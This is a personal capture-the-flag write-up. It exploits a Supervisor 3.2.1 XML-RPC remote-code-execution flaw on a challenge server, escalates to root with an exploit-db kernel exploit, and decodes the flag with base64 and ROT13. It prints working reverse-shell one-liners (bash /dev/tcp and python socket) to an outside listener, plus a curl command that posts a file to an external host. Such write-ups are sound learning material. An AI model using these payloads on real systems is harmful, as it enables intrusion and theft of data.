# Country(1000):  Sudan
----------
Description:  The final flag. Good luck!

/root/flag.txt
http://54.153.0.160
----------
Hint:  no
----------
Attachments:  []

~!|----------|!~

Doing stuff for the greater good of yehmen
no ofcourse not, this is sudan muda fukaaaa.

```
/root/flag.txt
http://54.153.0.160/
```

```
(ctf-website) ➜  ctf-website git:(master) ✗ curl -vv  http://54.153.0.160/
*   Trying 54.153.0.160...
* TCP_NODELAY set
* Connected to 54.153.0.160 (54.153.0.160) port 80 (#0)
> GET / HTTP/1.1
> Host: 54.153.0.160
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sat, 27 Oct 2018 01:06:01 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Tue, 12 Jan 2016 09:31:36 GMT
< ETag: "dd2-5291fb847ee00"
< Accept-Ranges: bytes
< Content-Length: 3538
< Vary: Accept-Encoding
< Content-Type: text/html
<
<!doctype html>
<!-- Website template by freewebsitetemplates.com -->
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Space Science Website Template</title>
	<link rel="stylesheet" href="css/style.css" type="text/css">
	<link rel="stylesheet" type="text/css" href="css/mobile.css">
	<script src="js/mobile.js" type="text/javascript"></script>
</head>
<body>
	<div id="page">
		<div id="header">
			<div>
				<a href="index.html" class="logo"><img src="images/logo.png" alt=""></a>
				<ul id="navigation">
					<li class="selected">
						<a href="index.html">Home</a>
					</li>
					<li>
						<a href="about.html">About</a>
					</li>
					<li class="menu">
						<a href="projects.html">Projects</a>
						<ul class="primary">
							<li>
								<a href="proj1.html">proj 1</a>
							</li>
						</ul>
					</li>
					<li class="menu">
						<a href="blog.html">Blog</a>
						<ul class="secondary">
							<li>
								<a href="singlepost.html">Single post</a>
							</li>
						</ul>
					</li>
					<li>
						<a href="contact.html">Contact</a>
					</li>
				</ul>
			</div>
		</div>
		<div id="body" class="home">
			<div class="header">
				<div>
					<img src="images/satellite.png" alt="" class="satellite">
					<h1>SOYUZ TMA-M</h1>
					<h2>SPACECRAFT</h2>
					<a href="blog.html" class="more">Read More</a>
					<h3>FEATURED PROJECTS</h3>
					<ul>
						<li>
							<a href="projects.html"><img src="images/project-image1.jpg" alt=""></a>
						</li>
						<li>
							<a href="projects.html"><img src="images/project-image2.jpg" alt=""></a>
						</li>
						<li>
							<a href="projects.html"><img src="images/project-image3.jpg" alt=""></a>
						</li>
						<li>
							<a href="projects.html"><img src="images/project-image4.jpg" alt=""></a>
						</li>
					</ul>
				</div>
			</div>
			<div class="body">
				<div>
					<h1>OUR MISSION</h1>
					<p>This website template has been designed by Free Website Templates for you, for free. You can replace all this text with your own text.</p>
				</div>
			</div>
			<div class="footer">
				<div>
					<ul>
						<li>
							<h1>FEATURED VIDEO</h1>
							<a href="blog.html"><img src="images/mars-rover.jpg" alt=""><span></span></a>
						</li>
						<li>
							<h1>LATEST BLOG</h1>
							<ul>
								<li>
									<a href="blog.html"><img src="images/finding-planet.jpg" alt=""></a>
									<h1>FINDING PLANET X-123</h1>
									<span>FEBRUARY 6, 2023</span>
									<a href="blog.html" class="more">Read More</a>
								</li>
								<li>
									<a href="blog.html"><img src="images/new-satellitedish.jpg" alt=""></a>
									<h1>NEW SATELLITE DISH</h1>
									<span>FEBRUARY 3, 2023</span>
									<a href="blog.html" class="more">Read More</a>
								</li>
							</ul>
						</li>
					</ul>
				</div>
			</div>
		</div>
		<div id="footer">
			<div class="connect">
				<div>
					<h1>FOLLOW OUR  MISSIONS ON</h1>
					<div>
						<a href="http://freewebsitetemplates.com/go/facebook/" class="facebook">facebook</a>
						<a href="http://freewebsitetemplates.com/go/twitter/" class="twitter">twitter</a>
						<a href="http://freewebsitetemplates.com/go/googleplus/" class="googleplus">googleplus</a>
						<a href="http://pinterest.com/fwtemplates/" class="pinterest">pinterest</a>
					</div>
				</div>
			</div>
			<div class="footnote">
				<div>
					<p>&copy; 2023 BY SPACE PROSPECTION | ALL RIGHTS RESERVED</p>
				</div>
			</div>
		</div>
	</div>
</body>
* Connection #0 to host 54.153.0.160 left intact
</html>%
```


seems like this thing is powered by apache

```
Apache/2.4.18 (Ubuntu) Server at 54.153.0.160 Port 80
```

and is running ubuntu

is it vulnerable to shell shock?

nope the answer is not however running nmap does show some promising open ports

```
(ctf-website) ➜  ctf-website git:(master) ✗ nmap -Pn 54.153.0.160
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-26 18:15 PDT
Nmap scan report for ec2-54-153-0-160.us-west-1.compute.amazonaws.com (54.153.0.160)
Host is up (0.0058s latency).
Not shown: 993 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
8000/tcp closed http-alt
8080/tcp closed http-proxy
8888/tcp closed sun-answerbook
9001/tcp open   tor-orport
```

one of them is 9001 which seems to be a supervisor (webmin?) server running, which will let me start / restart some services.
that means that i can start stuff , but i dont know how usefull that will be .

what is that?


```
(ctf-website) ➜  ctf-website git:(master) ✗ curl -vv http://54.153.0.160:9001/
*   Trying 54.153.0.160...
* TCP_NODELAY set
* Connected to 54.153.0.160 (54.153.0.160) port 9001 (#0)
> GET / HTTP/1.1
> Host: 54.153.0.160:9001
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Length: 1209
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Server: Medusa/1.12
< Pragma: no-cache
< Cache-Control: no-cache
< Date: Sat, 27 Oct 2018 01:19:58 GMT
< Content-Type: text/html
<
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
  <title>Supervisor Status</title>
  <link href="stylesheets/supervisor.css" rel="stylesheet" type="text/css" />
  <link href="images/icon.png" rel="icon" type="image/png" />
</head>
<body>
<div id="wrapper">

  <div id="header">
    <img alt="Supervisor status" src="images/supervisor.gif" />
  </div>

  <div>
    <div class="hidden">#</div>

    <form action="index.html" method="post">
      <ul class="clr" id="buttons">
        <li id="refresh"><a href="index.html?action=refresh">&nbsp;</a></li>
        <li id="restart_all"><a href="index.html?action=restartall">&nbsp;</a></li>
        <li id="stop_all"><a href="index.html?action=stopall">&nbsp;</a></li>
      </ul>

      No programs to manage</form>

  </div>

  <div class="push">
  </div>
</div>

<div class="clr" id="footer">
  <div class="left">
    <a href="http://supervisord.org">Supervisor</a> <span>3.2.1</span>
  </div>
  <div class="right">
    &copy; 2006-<span>2018</span> <strong><a href="http://agendaless.com/">Agendaless Consulting and Contributors</a></strong>
  </div>
</div>
</body>
* Connection #0 to host 54.153.0.160 left intact
</html>%
```


ok it seems to be running some version of medusa on there.

https://github.com/Supervisor/supervisor/tree/master/supervisor/medusa

and its a hella old version it starts to seem more likely to be exploitable.

almost immediately see remote code execution
http://vulapps.evalbug.com/s_supervisor/


tl;dr;
https://github.com/Supervisor/supervisor/issues/964

```python
supervisor.supervisord.options.execve /usr/bin/python python -c import os; os.system("/bin/bash -i >& /dev/tcp/142.93.194.254/4444 0>&1 &")
```

the exploit didnt work, but it did give me an idea, i just need to figure out how supervisor does versioning so i can find a copy of the vulnerable source then i can compare the source for xmlrpc between the vulnerable version and the version on this website and maybe just maybe ill have a clue on how to exploit it.

i dont know if this supervisor was part of the challenge but messing with it definitely crashed the shit out of it.

so back onto apache until i can reach one of the security guys to see if i stumbled on a mistake.

seems like apache is also vulnerable to something that will cause the bleed of extra information
https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html

nope forcing the server didnt yield anything.


the vulnerable version of supervisor.
https://github.com/Supervisor/supervisor/archive/3.2.1.tar.gz


reviewing the downloaded code it appears to be vulnerable, so why have my attempts been fruitless?  i need more information.

lets run a docker environment to find some logs

```
docker run --rm  -ti -p 9001:9001 -v `pwd`/supervisor-3.2.1/:/supervisor ubuntu 
```


since ubuntu is very minimal i installed python, and vim, created the supervisord.conf and committed the docker image
now i got a server i can keep running (in docker) and hopefully can exploit, that way i have something working to try on real one.

in python shell we can type
```
from xmlrpclib import ServerProxy
server = ServerProxy('http://54.153.0.160/RPC2')
server.supervisor.supervisord.options.execve("/usr/bin/curl", ["-vv", "-d", "@/etc/flag.txt", "-X", "POST", "http://ptsv2.com/t/wooh/post"], {})
```

use the config
```
```

start the supervisor using config file
```
supervisord -n -c supervisord.conf
```


lets get a remote shell going
142.93.194.254
```
root@hackbox:~# nc -vlp 4444                                                                                      
Listening on [0.0.0.0] (family 0, port 4444) 
```

possible reverse
```python
server.supervisor.supervisord.options.execve("python", ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("142.93.194.254",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'], {})
```

with bash
```
server.supervisor.supervisord.options.execve("/bin/bash", ["-c", "/bin/bash -i >& /dev/tcp/142.93.194.254/4444 >&0"], {}) 
```

Ok so none of that actually worked, but nice try!!

well it turns out if i read the source closer `execve` is a variant that will replace the supervisor process with whatever you specify, which is why
it was crashing.  Unfortunately in order to get it restarted i had to get the security team to manually do so, so thats no good.

This time i am going to try a different exploit (one that doesnt involve execve) that way i dont crash supervisord if it dont work.


```python
from xmlrpclib import ServerProxy

#command = 'bash -c "bash -i >& /dev/tcp/142.93.194.254/4444 >&0 &"'
command = '/bin/bash -c "2<&196;exec 196<>/dev/tcp/142.93.194.254/4444; sh <&196 >&196 2>&196"'

server = ServerProxy('http://54.153.0.160:9001/RPC2')

result = server.supervisor.supervisord.options.warnings.linecache.os.system(command)
#result = server.supervisor.supervisord.options.execve("/bin/bash", [command], {})
print(result)
```

woof we are in !  this shell isnt as pretty because it isnt a real shell, more like just character forwarding, but whatever who are we and where?

```
Connection from [54.153.0.160] port 4444 [tcp/*] accepted (family 2, sport 43230)

whoami
nobody
uname
Linux
uname -r
4.4.0-62-generic
```

well thats not helpful that means i cant read the flag which is in /root/flag.txt
looking at the version of the kernel we see that it is actually vulnerable to privelege escalation attack, so lets get it !

https://www.exploit-db.com/exploits/41458/

unfortunately this exploit also crashes the kernel, so maybe you have 1 or 2 commands worth of time, before you gotta wait for the restart.

```
cd /tmp
wget https://www.exploit-db.com/download/41458.c
gcc 41458.c -o pwn
chmod +x pwn
./pwn
```
now we can dump the flag    

```
bash: no job control in this shell
root@ip-172-30-0-234:/tmp# cat /root/flag.txt
cat /root/flag.txt
Not going to be that easy. Here's your flag. Now decode it!

UFh7cTc3MjZzbjlvNm5xNjEwNjgxcG4yOXBuMjY3OXJxNzY1MDMzcHM0cn0K
root@ip-172-30-0-234:/tmp#
```

well that was mean, looking at the code, the values seem to be in range of base64 table, and character count

shows that it "could" be base64 (61 % 4 == 1) 

```
➜  ctf git:(master) ✗ echo UFh7cTc3MjZzbjlvNm5xNjEwNjgxcG4yOXBuMjY3OXJxNzY1MDMzcHM0cn0K | wc -c
      61
```

and indeed it was

```
➜  ~ echo UFh7cTc3MjZzbjlvNm5xNjEwNjgxcG4yOXBuMjY3OXJxNzY1MDMzcHM0cn0K | base64 -D
PX{q7726sn9o6nq610681pn29pn2679rq765033ps4r}
```

now that looks like the flag from one of the previous challenges, which used a very popular cryptography aglorithm ROT-13
so decoding that we get
(because difference betwen P and C in ascii is 13)
and so there we go.

```
CK{d7726fa9b6ad610681ca29ca2679ed765033cf4e}
```